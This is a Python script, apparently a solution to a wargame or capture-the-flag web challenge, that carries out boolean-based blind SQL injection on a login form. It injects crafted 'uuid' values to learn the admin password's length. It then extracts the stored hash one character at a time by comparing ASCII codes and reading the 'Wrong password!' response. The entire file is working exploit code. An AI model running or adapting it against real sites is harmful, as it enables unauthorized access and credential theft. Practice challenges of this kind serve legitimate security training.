import info
import requests

url = "/challenge/bonus-2/index.php"
# len 
len = 0
for i in range(1, 50):
	data = {'uuid':"admin' and length(pw)={} -- ".format(str(i)), 'pw':'123'}
	res = requests.post(info.url + url, cookies = info.cookies, data = data)
	
	if ("Wrong password!" in res.text):
		len = i
		break
print("pw length: {}".format(len))

# md5 hash : 32
pw = ""
for i in range(1, len + 1):
	for j in range(48, 123):
		data = {'uuid':"admin' and ascii(substr(pw, {}, 1))={} -- ".format(str(i), str(j)), 'pw':'123'}
		res = requests.post(info.url + url, cookies = info.cookies, data = data)
		
		if ("Wrong password!" in res.text):
			pw += chr(j)
#			print(pw)
			break;
print("pw: {}".format(pw))			
